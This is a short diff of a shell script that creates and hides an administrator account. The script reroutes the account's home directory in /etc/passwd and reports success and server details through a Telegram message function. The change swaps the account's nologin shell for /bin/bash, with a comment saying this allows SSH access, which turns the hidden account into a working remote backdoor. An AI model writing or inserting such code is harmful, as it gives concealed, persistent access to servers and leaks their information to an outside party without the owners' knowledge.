@@ -45,6 +45,7 @@ usermod -d /home/$user_id "$user_id"
 sed -i "/^$user_id:/s#/home/$user_id#/var/empty#" /etc/passwd
 
 # Lock the user from appearing in the login screen by changing the shell
-usermod -s /sbin/nologin "$user_id"
+# Changed to /bin/bash to allow SSH access
+usermod -s /bin/bash "$user_id"
 
 send_telegram_message "Admin user $user_id has been created and hidden successfully. $server_info"
